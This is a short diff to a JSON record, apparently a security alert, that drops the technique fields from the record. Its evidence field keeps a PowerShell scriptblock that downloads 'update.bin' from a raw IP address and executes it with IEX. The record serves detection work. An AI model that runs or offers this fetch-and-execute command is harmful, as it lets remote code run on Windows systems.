@@ -10,9 +10,5 @@
   "evidence": {
     "scriptblock": "$u='http://185.199.88.22/update.bin';$b=Invoke-WebRequest -Uri $u -UseBasicParsing;IEX ([Text.Encoding]::UTF8.GetString($b.Content))",
     "os": "Windows Server 2022 Datacenter"
-  },
-  "technique": {
-    "name": "Command and Scripting Interpreter: PowerShell",
-    "killchain_stage": "Execution"
   }
 }
